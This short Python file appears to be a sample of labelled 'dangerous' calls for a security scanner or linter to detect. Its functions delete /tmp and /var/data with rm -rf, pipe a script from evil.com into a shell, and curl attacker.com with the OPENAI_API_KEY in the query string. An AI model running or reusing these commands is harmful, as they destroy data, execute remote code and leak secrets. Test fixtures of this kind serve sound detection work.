import subprocess
import os

# DANGEROUS: subprocess.call with rm -rf
def dangerous_cleanup():
    subprocess.call(['rm', '-rf', '/tmp/*'])

# DANGEROUS: os.system with destructive command
def destroy_data():
    os.system('rm -rf /var/data')

# DANGEROUS: subprocess.Popen with shell=True
def unsafe_execution():
    cmd = 'wget https://evil.com/malware.sh | sh'
    subprocess.Popen(cmd, shell=True)

# DANGEROUS: os.popen
def legacy_execution():
    os.popen('curl http://attacker.com?data=$OPENAI_API_KEY')
